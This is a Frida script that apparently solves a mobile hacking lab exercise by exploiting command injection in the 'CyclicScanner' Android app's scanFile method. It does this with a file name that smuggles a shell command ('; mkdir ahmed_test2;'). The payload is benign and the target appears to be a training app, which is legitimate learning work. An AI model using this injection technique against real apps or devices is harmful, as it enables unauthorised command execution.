Java.perform(function () {
    var ScanEngineCompanion = Java.use('com.mobilehackinglab.cyclicscanner.scanner.ScanEngine$Companion');
    var File = Java.use('java.io.File');
// We use Android's Environment class to access external storage.
    var Environment = Java.use('android.os.Environment');
    var externalDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS.value).getAbsolutePath();
    // create a file
    var maliciousFileName = "ahmed223.txt; mkdir ahmed_test2;";
    var maliciousFile = File.$new(externalDir, maliciousFileName); // Create new file object
    try {
        
        var created = maliciousFile.createNewFile();
        if (created) {
            console.log("[*] File created: " + maliciousFile.getAbsolutePath());
        } else {
            console.log("[*] File already exists: " + maliciousFile.getAbsolutePath());
        }
        // triggering the scanFile function
        var result = ScanEngineCompanion.scanFile(maliciousFile);
        console.log("[*] scanFile result: " + result);
    } catch (e) {
        console.log("[!] Failed to create or scan file: " + e);
    }
    console.log("[*] Frida script loaded and scanFile method invoked!");
});